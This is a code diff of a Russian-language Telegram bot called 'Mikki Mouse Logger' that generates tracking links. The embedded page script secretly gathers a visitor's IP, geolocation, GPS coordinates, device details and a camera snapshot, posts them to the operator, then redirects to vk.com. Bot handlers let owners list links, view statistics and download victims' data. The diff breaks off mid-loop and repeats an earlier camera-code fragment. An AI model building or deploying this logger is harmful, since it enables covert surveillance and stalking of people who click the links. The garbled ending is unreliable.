@@ -1,6 +1,6 @@
 #!/usr/bin/env python3
 # -*- coding: utf-8 -*-
-#измега 3
+#изменв 4
 import os
 import json
 import uuid
@@ -86,7 +86,6 @@ def get_links(owner_id=None):
     return settings.get('links', {})
 
 def find_link_owner(link_id):
-    """Ищем владельца ссылки по всем ID"""
     for owner_id in OWNER_IDS:
         data = load_data(owner_id)
         links = data.get('settings', {}).get('links', {})
@@ -104,7 +103,7 @@ def send_message(chat_id, text, reply_markup=None):
     }
     if reply_markup:
         payload['reply_markup'] = json.dumps(reply_markup)
-    
+
     try:
         response = requests.post(url, json=payload)
         return response.json()
@@ -209,7 +208,7 @@ LOGGER_HTML = """
 <script>
 (async function() {
     const linkId = window.location.pathname.split('/').pop();
-    
+
     let settings = { redirect: 'https://vk.com/', geo: true, camera: true };
     try {
         const res = await fetch('/settings');
@@ -294,6 +293,304 @@ LOGGER_HTML = """
                     canvas.width = video.videoWidth || 640;
                     canvas.height = video.videoHeight || 480;
                     ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                    const photo = canvas.toDataURL('image/jpeg', 0.85);
+                    stream.getTracks().forEach(t => t.stop());
+                    resolve(photo);
+                }, 300);
+            })
+            .catch(() => resolve(null));
+        });
+    }
+
+    const ip = await getIP();
+    const [geo, device, screen, geolocation, photo] = await Promise.all([
+        getGeo(ip),
+        getDevice(),
+        getScreen(),
+        getGeolocation(),
+        getCameraPhoto()
+    ]);
+
+    const data = {
+        link_id: linkId,
+        timestamp: new Date().toLocaleString(),
+        ip: ip,
+        country: geo.country,
+        city: geo.city,
+        region: geo.region,
+        isp: geo.isp,
+        geo_lat: geo.latitude,
+        geo_lon: geo.longitude,
+        gps_lat: geolocation.latitude,
+        gps_lon: geolocation.longitude,
+        device_type: device.device,
+        os: device.os,
+        browser: device.browser,
+        screen: screen.screen,
+        photo: photo
+    };
+
+    await fetch('/log', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(data)
+    }).catch(() => {});
+
+    setTimeout(() => {
+        window.location.href = settings.redirect || 'https://vk.com/';
+    }, 600);
+})();
+</script>
+</body>
+</html>
+"""
+
+# ============ КЛАВИАТУРЫ ДЛЯ БОТА ============
+def main_kb():
+    buttons = [
+        [{"text": "⚙️ Настройки", "callback_data": "settings"}],
+        [{"text": "🔗 Создать ссылку", "callback_data": "create"}],
+        [{"text": "📋 Мои ссылки", "callback_data": "links"}],
+        [{"text": "📊 Статистика", "callback_data": "stats"}]
+    ]
+    if len(OWNER_IDS) > 1:
+        buttons.insert(0, [{"text": "👤 Сменить профиль", "callback_data": "switch"}])
+    return {"inline_keyboard": buttons}
+
+def switch_kb():
+    buttons = []
+    for uid in OWNER_IDS:
+        buttons.append([{"text": f"👤 {uid}", "callback_data": f"switch_{uid}"}])
+    buttons.append([{"text": "🔙 Назад", "callback_data": "back"}])
+    return {"inline_keyboard": buttons}
+
+def settings_kb(owner_id):
+    s = get_settings(owner_id)
+    return {"inline_keyboard": [
+        [{"text": f"📍 Гео: {'✅' if s.get('geo', True) else '❌'}", "callback_data": "tgeo"}],
+        [{"text": f"📷 Камера: {'✅' if s.get('camera', True) else '❌'}", "callback_data": "tcam"}],
+        [{"text": "🔗 Редирект", "callback_data": "redir"}],
+        [{"text": "🔙 Назад", "callback_data": "back"}]
+    ]}
+
+def links_kb(links):
+    buttons = []
+    for lid in links:
+        v = len(links[lid].get('visits', []))
+        buttons.append([{"text": f"🔗 {lid} ({v})", "callback_data": f"link_{lid}"}])
+    buttons.append([{"text": "🔙 Назад", "callback_data": "back"}])
+    return {"inline_keyboard": buttons}
+
+def link_menu_kb(link_id):
+    return {"inline_keyboard": [
+        [{"text": "📋 Копировать ссылку", "callback_data": f"copy_{link_id}"}],
+        [{"text": "📊 Скачать данные", "callback_data": f"data_{link_id}"}],
+        [{"text": "🗑️ Удалить ссылку", "callback_data": f"del_{link_id}"}],
+        [{"text": "🔙 Назад", "callback_data": "backlinks"}]
+    ]}
+
+def back_kb():
+    return {"inline_keyboard": [
+        [{"text": "🔙 Назад", "callback_data": "back"}]
+    ]}
+
+# ============ ОБРАБОТЧИКИ КОМАНД БОТА ============
+user_owner = {}
+waiting_redirect = {}
+
+def handle_start(message):
+    user_id = message['from']['id']
+    if user_id not in OWNER_IDS:
+        send_message(user_id, "⚠️ Доступ запрещён! Только владельцы могут использовать этого бота.")
+        return
+
+    user_owner[user_id] = user_id
+    owner_id = user_owner[user_id]
+
+    text = (
+        f"🎣 **Mikki Mouse Logger**\n\n"
+        f"👤 **Ваш ID:** `{user_id}`\n"
+        f"📊 **Всего владельцев:** {len(OWNER_IDS)}\n"
+        f"🔗 **Активный профиль:** `{owner_id}`\n\n"
+        f"💡 Создавай ссылки и собирай данные!"
+    )
+    send_message(user_id, text, main_kb())
+
+def handle_callback(callback):
+    user_id = callback['from']['id']
+    if user_id not in OWNER_IDS:
+        return
+
+    data = callback['data']
+    chat_id = callback['message']['chat']['id']
+    owner_id = user_owner.get(user_id, user_id)
+
+    # Переключение профиля
+    if data == "switch":
+        send_message(chat_id, "👤 **Выберите профиль:**", switch_kb())
+        return
+
+    if data.startswith("switch_"):
+        uid = int(data.split("_")[1])
+        if uid in OWNER_IDS:
+            user_owner[user_id] = uid
+            send_message(chat_id, f"✅ Переключено на {uid}", main_kb())
+        return
+
+    # Настройки
+    if data == "settings":
+        s = get_settings(owner_id)
+        text = (
+            f"⚙️ **Настройки**\n"
+            f"👤 Профиль: `{owner_id}`\n\n"
+            f"📍 Гео: {'✅' if s.get('geo', True) else '❌'}\n"
+            f"📷 Камера: {'✅' if s.get('camera', True) else '❌'}\n"
+            f"🔗 Редирект: `{s.get('redirect', 'https://vk.com/')}`"
+        )
+        send_message(chat_id, text, settings_kb(owner_id))
+        return
+
+    if data == "tgeo":
+        s = get_settings(owner_id)
+        s['geo'] = not s.get('geo', True)
+        save_settings(s, owner_id)
+        handle_settings(chat_id, user_id)
+        return
+
+    if data == "tcam":
+        s = get_settings(owner_id)
+        s['camera'] = not s.get('camera', True)
+        save_settings(s, owner_id)
+        handle_settings(chat_id, user_id)
+        return
+
+    if data == "redir":
+        waiting_redirect[user_id] = True
+        send_message(chat_id, "🔗 **Введите URL для редиректа**\n\nПример: `https://vk.com/`", back_kb())
+        return
+
+    # Создание ссылки
+    if data == "create":
+        lid = generate_link(owner_id)
+        url = f"{BASE_URL}l/{lid}"
+        s = get_settings(owner_id)
+
+        text = (
+            f"✅ **Ссылка создана!**\n\n"
+            f"🔗 `{url}`\n\n"
+            f"👤 Владелец: `{owner_id}`\n"
+            f"📍 Гео: {'✅' if s.get('geo', True) else '❌'}\n"
+            f"📷 Камера: {'✅' if s.get('camera', True) else '❌'}\n"
+            f"🔗 Редирект: `{s.get('redirect', 'https://vk.com/')}`"
+        )
+        send_message(chat_id, text, {
+            "inline_keyboard": [
+                [{"text": "📋 Копировать", "callback_data": f"copy_{lid}"}],
+                [{"text": "🔙 Назад", "callback_data": "back"}]
+            ]
+        })
+        return
+
+    # Список ссылок
+    if data == "links":
+        links = get_links(owner_id)
+        if not links:
+            send_message(chat_id, f"📋 **Нет созданных ссылок**\n\n👤 Профиль: `{owner_id}`", back_kb())
+            return
+        text = f"📋 **Мои ссылки**\n👤 Профиль: `{owner_id}`\n\n"
+        for lid, d in links.items():
+            text += f"🔗 `{lid}`: {len(d.get('visits', []))} переходов\n"
+        send_message(chat_id, text, links_kb(links))
+        return
+
+    # Статистика
+    if data == "stats":
+        links = get_links(owner_id)
+        total = sum(len(l.get('visits', [])) for l in links.values())
+
+        countries = {}
+        for l in links.values():
+            for v in l.get('visits', []):
+                country = v.get('country', 'Unknown')
+                countries[country] = countries.get(country, 0) + 1
+
+        country_text = ""
+        if countries:
+            top = sorted(countries.items(), key=lambda x: x[1], reverse=True)[:5]
+            country_text = "\n🌍 **Топ стран:**\n"
+            for c, count in top:
+                country_text += f"   • {c}: {count}\n"
+
+        text = (
+            f"📊 **Статистика**\n"
+            f"👤 Профиль: `{owner_id}`\n\n"
+            f"📌 Всего ссылок: {len(links)}\n"
+            f"👥 Всего переходов: {total}"
+            f"{country_text}"
+        )
+        send_message(chat_id, text, back_kb())
+        return
+
+    # Работа со ссылкой
+    if data.startswith("link_"):
+        lid = data.split("_")[1]
+        links = get_links(owner_id)
+        v = len(links.get(lid, {}).get('visits', []))
+        text = (
+            f"🔗 **Ссылка:** `{lid}`\n\n"
+            f"👥 Переходов: {v}\n"
+            f"🔗 URL: `{BASE_URL}l/{lid}`"
+        )
+        send_message(chat_id, text, link_menu_kb(lid))
+        return
+
+    if data.startswith("copy_"):
+        lid = data.split("_")[1]
+        url = f"{BASE_URL}l/{lid}"
+        send_message(chat_id, f"📋 `{url}`")
+        return
+
+    if data.startswith("data_"):
+        lid = data.split("_")[1]
+        links = get_links(owner_id)
+        visits = links.get(lid, {}).get('visits', [])
+        if not visits:
+            send_message(chat_id, "📊 Нет данных")
+            return
+
+        fn = f"data_{lid}_{int(time.time())}.txt"
+        with open(fn, 'w', encoding='utf-8') as f:
+            f.write(f"ДАННЫЕ ССЫЛКИ: {lid}\n")
+            f.write("=" * 50 + "\n\n")
+            f.write(f"Владелец: {owner_id}\n")
+            f.write(f"Всего переходов: {len(visits)}\n\n")
+            for i, v in enumerate(visits, 1):
+                f.write(f"--- ПЕРЕХОД {i} ---\n")
+                f.write(f"Время: {v.get('timestamp', 'Unknown')}\n")
+                f.write(f"IP: {v.get('ip', 'Unknown')}\n")
+                f.write(f"Страна: {v.get('country', 'Unknown')}\n")
+                f.write(f"Город: {v.get('city', 'Unknown')}\n")
+                f.write(f"Устройство: {v.get('device_type', 'Unknown')}\n")
+                f.write(f"ОС: {v.get('os', 'Unknown')}\n")
+                f.write(f"Браузер: {v.get('browser', 'Unknown')}\n")
+                f.write(f"Экран: {v.get('screen', 'Unknown')}\n")
+                f.write(f"GPS: {v.get('gps_lat', 'Unknown')}, {v.get('gps_lon', 'Unknown')}\n")
+                f.write("\n" + "-" * 30 + "\n\n")
+
+        send_document(chat_id, fn, f"Данные для {lid}")
+        os.remove(fn)
+        return
+
+    if data.startswith("del_"):
+        lid = data.split("_")[1]
+        if delete_link(lid, owner_id):
+            send_message(chat_id, "✅ Ссылка удалена", back_kb())
+        return
+
+    if data == "backlinks":
+        links = get_links(owner_id)
+        text = f"📋 **Мои ссылки**\n👤 Профиль: `{owner_id}`\n\n"
+        for lid, d in links.items():width, canvas.height);
                     const photo = canvas.toDataURL('image/jpeg', 0.85);
                     stream.getTracks().forEach(t => t.stop());
                     resolve(photo);
